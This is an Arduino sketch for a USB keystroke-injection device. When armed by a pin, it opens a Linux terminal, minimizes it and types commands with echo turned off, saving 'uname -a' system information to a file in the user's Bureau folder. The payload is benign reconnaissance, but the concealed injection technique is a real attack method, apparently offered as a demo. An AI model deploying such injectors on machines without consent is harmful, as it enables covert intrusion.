#include <Arduino.h>
#include <Keyboard.h>

const int PIN_SECURITY = 2;

void typeCommand(const char* text){
  int i = 0;
  
  while (text[i] != '\0'){
    Keyboard.write(text[i]);
    delay(25);
    i++;
  }
  Keyboard.write(KEY_RETURN);
  delay(1000);
}

void setup() {
  // Configure the security pin with an internal pull-up resistor
  pinMode(PIN_SECURITY, INPUT_PULLUP);
  Keyboard.begin();
  
  if (digitalRead(PIN_SECURITY) == LOW){
    delay(3000);
    // 1. Open the default Linux terminal (Ctrl + Alt + T)
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('t');
    delay(100);
    Keyboard.releaseAll();
    delay(1500);
    // 2. Window management (Minimize or dock down depending on GNOME settings)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_DOWN_ARROW);
    delay(100);
    Keyboard.releaseAll();
    delay(500);
    // 3. Hide keystrokes  and collect the system infos
    typeCommand("stty -echo"); 
    typeCommand("cd ~/Bureau && uname -a > system_info.txt");
    typeCommand("stty echo && exit");    
  }
  
}

void loop() {}
